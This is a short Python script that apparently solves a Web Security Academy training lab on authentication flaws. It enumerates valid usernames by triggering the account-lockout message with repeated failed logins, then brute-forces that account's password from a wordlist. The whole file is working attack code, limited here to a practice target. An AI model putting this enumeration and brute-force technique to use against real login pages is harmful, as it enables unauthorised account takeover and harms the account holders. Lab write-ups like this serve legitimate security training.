import requests

if __name__ == '__main__':
    s = requests.Session()

    custom_id = "ac591f321fc606d3c0ee3de900fb00aa"
    site = f'{custom_id}.web-security-academy.net'
    login_url = f'''https://{site}/login'''
    lines = open("auth-lab-usernames", "r").readlines()

    atkTarget = ""

    for user in lines:
        target = user.strip()
        logindata = {
            'username': target,
            'password': 'foo'
        }
        resp = None  # Just to make IntelliJ stop yelling at me
        for i in range(6):
            resp = s.post(login_url, data=logindata)
        if "You have made too many incorrect login attempts" in (resp.text if resp is not None else ""):
            atkTarget = target
            print(f'username is {target}')
            break

    passwords = open("candidate-lab-passwords", "r").readlines()
    for password in passwords:
        pw = password.strip()
        loginData = {
            'username': atkTarget,
            'password': pw
        }
        resp = s.post(login_url, data=loginData)
        # No warning in text means the password was correct, otherwise returns the login attempt warning
        if 'You have made too many incorrect login attempts' not in resp.text:
            print("Password: ", pw)
